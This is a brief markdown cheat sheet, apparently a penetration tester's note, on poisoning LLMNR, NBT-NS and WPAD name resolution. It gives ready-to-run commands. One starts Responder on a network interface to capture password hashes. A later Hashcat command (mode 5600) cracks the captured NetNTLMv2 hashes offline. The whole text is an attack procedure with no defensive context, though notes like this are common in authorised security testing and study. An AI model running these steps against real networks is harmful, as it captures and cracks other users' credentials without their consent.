## LLMNR (Link-Local Multicast Name Resolution)

## NBT-NS (NetBIOS Name Server)

## WPAD (Web Proxy Auto-Discovery)

### Tools: Responder, Hashcat

## Steps:

#### 1) sudo responder -I YOUR_INTERFACE

#### 2) Leave it for a bit (average 10 minutes)

#### 3) Offline cracking with hashcat ( hashcat -m 5600 HASHFILE PASSWORDFILE --force )
